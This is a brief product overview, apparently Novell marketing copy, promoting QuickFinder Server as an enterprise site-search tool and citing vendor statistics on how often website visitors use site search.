Overview
--------

If your company's Web site is like most, it's not lacking in information. While your site's visitors have access to massive amounts of data, they may benefit from a faster, 
more efficient way to pinpoint what they're looking for: QuickFinder Server (formerly NetWare® Web Search) from Novell.

Unlike all-Web search engines, QuickFinder is targeted at the Enterprise. General Internet search engines index many Web sites and their component pages, but they either cannot or do not index all available content. Perhaps that's the reason more than 75 percent of Web-site visitors use site-specific search functionality when it's available to them. In fact, for many Web sites, the search-results page has more hits than does the home page. 
Yet more than 50 percent of large Web sites (over 500,000 pages) and 70 percent of moderately sized Web sites (up to 5,000 pages) do not offer search functionality to their visitors.
